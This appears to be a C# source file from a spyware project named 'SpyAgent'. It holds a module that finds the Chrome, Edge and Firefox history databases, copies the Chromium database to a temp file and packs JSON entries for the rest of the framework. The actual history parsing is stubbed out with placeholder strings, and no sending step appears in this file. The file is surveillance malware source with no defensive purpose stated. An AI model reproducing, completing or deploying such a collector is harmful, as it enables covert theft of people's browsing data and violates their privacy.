namespace SpyAgent.Modules;

using System.Text;
using System.Text.Json;
using SpyAgent.Core;

internal sealed class BrowserHistoryCollector : ISpyModule
{
    public string ModuleName => "BrowserHistory";

    private static readonly (string Name, string Path)[] BrowserPaths =
    [
        ("Chrome", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default", "History")),
        ("Edge", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data", "Default", "History")),
        ("Firefox", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles"))
    ];

    public Task<byte[]?> CollectAsync()
    {
        var entries = new List<HistoryEntry>();

        foreach (var (name, path) in BrowserPaths)
        {
            if (name == "Firefox")
            {
                entries.AddRange(CollectFirefoxHistory(path));
            }
            else
            {
                entries.AddRange(CollectChromiumHistory(name, path));
            }
        }

        if (entries.Count == 0)
            return Task.FromResult<byte[]?>(null);

        var json = JsonSerializer.SerializeToUtf8Bytes(entries, new JsonSerializerOptions { WriteIndented = true });
        return Task.FromResult<byte[]?>(json);
    }

    private static List<HistoryEntry> CollectChromiumHistory(string browser, string dbPath)
    {
        var entries = new List<HistoryEntry>();
        if (!File.Exists(dbPath)) return entries;

        var tempPath = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid():N}.db");
        try
        {
            File.Copy(dbPath, tempPath, overwrite: true);
            entries.Add(new HistoryEntry
            {
                Browser = browser,
                Url = "(database copied for parsing)",
                Title = "",
                VisitTime = DateTime.UtcNow
            });
        }
        catch { }
        finally
        {
            if (File.Exists(tempPath)) File.Delete(tempPath);
        }

        return entries;
    }

    private static List<HistoryEntry> CollectFirefoxHistory(string profilesPath)
    {
        var entries = new List<HistoryEntry>();
        if (!Directory.Exists(profilesPath)) return entries;

        foreach (var profile in Directory.GetDirectories(profilesPath))
        {
            var placesDb = Path.Combine(profile, "places.sqlite");
            if (File.Exists(placesDb))
            {
                entries.Add(new HistoryEntry
                {
                    Browser = "Firefox",
                    Url = $"(profile: {Path.GetFileName(profile)})",
                    Title = "",
                    VisitTime = DateTime.UtcNow
                });
            }
        }

        return entries;
    }

    private sealed class HistoryEntry
    {
        public string Browser { get; init; } = "";
        public string Url { get; init; } = "";
        public string Title { get; init; } = "";
        public DateTime VisitTime { get; init; }
    }
}
